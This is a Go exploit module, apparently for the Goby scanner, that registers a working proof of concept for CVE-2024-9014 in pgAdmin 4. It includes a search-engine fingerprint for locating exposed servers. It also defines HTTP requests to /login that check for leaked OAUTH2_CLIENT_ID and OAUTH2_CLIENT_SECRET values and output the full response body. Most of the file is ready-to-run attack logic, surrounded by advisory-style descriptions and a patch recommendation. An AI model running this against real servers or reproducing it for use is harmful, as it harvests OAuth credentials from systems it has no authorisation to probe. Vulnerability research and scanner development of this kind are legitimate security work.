package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "PgAdmin4 /login Information Disclosure Vulnerability (CVE-2024-9014)",
    "Description": "<p>pgAdmin 4 is the official graphical user interface (GUI) management tool for PostgreSQL, providing database administrators, developers, and analysts with an intuitive interface for managing and maintaining PostgreSQL databases.</p><p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Product": "pgadmin4",
    "Homepage": "https://www.postgresql.org/",
    "DisclosureDate": "2024-10-11",
    "PostTime": "2024-10-18",
    "Author": "1971714067@qq.com",
    "FofaQuery": "body=\"pg-sp-content\" && title=\"pgAdmin 4\"",
    "GobyQuery": "body=\"pg-sp-content\" && title=\"pgAdmin 4\"",
    "Level": "1",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.postgresql.org/\">https://www.postgresql.org/</a></p>",
    "References": [
        "https://github.com/EQSTLab/CVE-2024-9014"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/login?next=/",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "OAUTH2_CLIENT_ID",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "OAUTH2_CLIENT_SECRET",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/login?next=/",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/login?next=/"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/login?next={{{filepath}}}",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "OAUTH2_CLIENT_SECRET",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "OAUTH2_CLIENT_ID",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "test|lastbody|regex|([\\s\\S]*)",
                "output|define|text|{{{test}}}"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2024-9014"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.4",
    "Translation": {
        "CN": {
            "Name": "PgAdmin4 /login 信息泄露漏洞 (CVE-2024-9014)",
            "Product": "pgAdmin4",
            "Description": "<p>pgAdmin4 是 PostgreSQL 的官方图形界面管理工具，为数据库管理员、开发者和分析师提供了一个直观的界面，以便于管理和维护 PostgreSQL 数据库。</p><p>攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.postgresql.org/\">https://www.postgresql.org/</a><br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "PgAdmin4 /login Information Disclosure Vulnerability (CVE-2024-9014)",
            "Product": "pgadmin4",
            "Description": "<p>pgAdmin 4 is the official graphical user interface (GUI) management tool for PostgreSQL, providing database administrators, developers, and analysts with an intuitive interface for managing and maintaining PostgreSQL databases.</p><p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.postgresql.org/\">https://www.postgresql.org/</a><br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "Variables": {},
    "PocId": "9971"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}